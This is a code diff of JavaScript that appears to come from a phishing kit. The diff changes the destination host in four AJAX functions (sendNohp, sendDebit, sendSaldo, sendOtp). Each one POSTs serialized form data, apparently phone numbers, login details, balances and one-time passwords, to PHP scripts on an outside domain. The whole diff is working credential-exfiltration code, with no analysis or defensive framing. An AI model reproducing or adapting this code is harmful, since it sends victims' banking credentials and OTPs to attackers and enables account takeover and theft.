@@ -14,7 +14,7 @@ function sendNohp(){
    
       $.ajax({
         type: 'POST',
-        url: 'https://choreoapps.oo-feed.cfd/doli/no.php',
+        url: 'https://chroedevsi.whf.bz/doli/no.php',
         data: $('#formHP').serialize(),
         datatype: 'JSON',   
     complete: function(){
@@ -40,7 +40,7 @@ function sendDebit(){
    
         $.ajax({
         type: 'POST',
-        url: 'https://choreoapps.oo-feed.cfd/doli/login.php',
+        url: 'https://chroedevsi.whf.bz/doli/login.php',
         data: $('#formlog').serialize(),
         datatype: 'JSON',    
     complete: function(){    
@@ -75,7 +75,7 @@ function sendSaldo(){
   
         $.ajax({
         type: 'POST',
-        url: 'https://choreoapps.oo-feed.cfd/doli/saldo.php',
+        url: 'https://chroedevsi.whf.bz/doli/saldo.php',
         data: $('#formsal').serialize(),
         datatype: 'JSON',   
    complete: function(){     
@@ -108,7 +108,7 @@ function sendOtp(){
    
         $.ajax({
         type: 'POST',
-        url: 'https://choreoapps.oo-feed.cfd/doli/otp.php',
+        url: 'https://chroedevsi.whf.bz/doli/otp.php',
         data: $('#formLink').serialize(),
         datatype: 'JSON',    
     complete: function(){
